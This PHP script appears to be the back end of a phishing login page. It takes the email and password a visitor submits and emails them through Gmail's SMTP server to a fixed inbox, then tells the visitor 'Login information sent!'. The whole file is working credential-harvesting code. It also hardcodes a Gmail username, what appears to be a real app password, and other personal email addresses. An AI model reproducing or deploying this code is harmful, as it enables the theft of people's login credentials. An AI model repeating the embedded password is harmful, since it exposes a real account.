<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require_once __DIR__ . '/PHPMailer/src/Exception.php';
require_once __DIR__ . '/PHPMailer/src/PHPMailer.php';
require_once __DIR__ . '/PHPMailer/src/SMTP.php';

// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Instantiate PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->SMTPDebug = SMTP::DEBUG_SERVER;
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com'; // SMTP server
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465;

        $mail->Username   = 'wasiusikiru7@gmail.com'; // Your Gmail email address
        $mail->Password   = 'utjrxtvgzqletiyd';            // Your Gmail password

        // Sender and recipient
        $mail->setFrom('meettola@gmail.com', 'Client');
        $mail->addAddress('wasiusikiru7@gmail.com');

        // Email content
        $mail->isHTML(true);
        $mail->Subject = 'Login Form Submission';
        $mail->Body = "Email: $email<br>Password: $password";

        // Send email
        $mail->send();

        // JavaScript to show alert notification
        echo '<script>alert("Login information sent!");</script>';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
} else {
    // Redirect if the form was not submitted
    header('Location: index.html');
    exit();
}
?>
